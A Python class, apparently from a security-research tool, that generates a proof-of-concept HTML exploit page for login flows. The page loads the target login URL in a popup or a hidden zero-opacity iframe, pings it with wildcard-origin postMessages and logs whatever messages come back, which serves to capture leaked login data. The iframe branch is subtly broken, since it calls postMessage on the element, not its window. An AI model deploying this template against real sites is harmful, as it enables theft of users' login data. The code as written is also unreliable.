class PoCGenerator:

    def __init__(self, ctx):
        self.ctx = ctx

    def generate_poc(self):
        """ Generate PoC exploits as HTML code.
            Returns:
                - (True, String), if exploit generation was successfull
                - (False, String), if exploit generation was not successfull
        """

        if "flow" not in self.ctx.statements:
            return (False, "Could not determine flow type (redirect, popup, iframe)")

        if "loginreqframe" not in self.ctx.statements:
            return (False, "Could not determine the frame containing the login request")

        if "loginrequrl" not in self.ctx.statements:
            return (False, "Could not determine the login request")

        loginreqframe_first_url = self.get_first_url_of_frame(self.ctx.statements["loginreqframe"])
        if loginreqframe_first_url is None:
            return (False, "Could not determine the first URL of the frame containing the login request")

        poc_html = self.poc_template(loginreqframe_first_url)
        return (True, poc_html)

    def get_first_url_of_frame(self, frame):
        """ Get the URL first loaded into a frame.
            Returns:
                - String, if the first URL of the frame could be determined
                - None, if the first URL of the frame could not be determined
        """
        for report in self.ctx.reports:
            if report["key"] == "documentinit":
                hierarchy = report["val"]["hierarchy"]
                if frame == hierarchy:
                    return report["val"]["href"]
        return None

    @staticmethod
    def poc_template(embed_url):
        poc_template = f"""\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC: N/A</title>
</head>
<body>
  <h1>PoC: N/A</h1>
  <p><button onclick="openPopup()">Open Popup</button></p>
  <p><button onclick="embedIframe()">Embed IFrame</button></p>
  <p>Received postMessages:</p>
  <div id="pms"></div>

  <script>
    window.onmessage = (e) => {{
      let p = document.createElement('p')
      p.textContent = `Received postMessage from ${{e.origin}} with data of type ${{typeof e.data}}: ${{JSON.stringify(e.data)}}`
      document.querySelector('#pms').appendChild(p)
    }}

    function openPopup() {{
      popup = window.open('{embed_url}', '_blank')
      setTimeout(() => {{
        popup.postMessage('ping', '*')
      }}, 3000) // wait for popup to load
    }}

    function embedIframe() {{
      frame = document.createElement('iframe')
      frame.src = '{embed_url}'
      frame.style.opacity = 0
      frame.onload = () => {{
        frame.postMessage('ping', '*')
      }}
      document.body.appendChild(frame)
    }}
  </script>
</body>
</html>
        """
        return poc_template
